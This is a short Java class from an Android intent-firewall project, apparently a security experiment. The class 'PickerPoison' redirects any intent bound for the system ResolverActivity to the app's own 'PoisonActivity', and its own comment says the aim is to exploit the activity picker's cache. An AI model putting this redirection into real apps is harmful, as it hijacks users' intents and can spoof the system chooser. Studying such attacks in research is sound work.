package com.carteryagemann.seintentfirewall;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * Experimental class for trying to exploit a cache maintained by the system activity picker.
 */
public class PickerPoison extends FirewallService.IntentChecker {
    private static final String TAG = "PickerPoison";

    @Override
    public Bundle checkIntent(Bundle data) {
        Intent intent = data.getParcelable("intent");
        if (intent == null) {
            Log.w(TAG, "Received bundle with no intent! Dropping.");
            return null;
        }
        ComponentName receiver = intent.getComponent();
        // Redirect this intent if the receiver is the browser
        if (receiver != null && receiver.getPackageName().contains("android") &&
                receiver.getClassName().contains("ResolverActivity")) {
            intent.setComponent(
                    new ComponentName("com.carteryagemann.seintentfirewall",
                    "com.carteryagemann.seintentfirewall.PoisonActivity"));
            data.putParcelable("intent", intent);
            return data;
        } else {
            return data;
        }
    }

    @Override
    public String getName() {
        return "PickerPoison";
    }
}
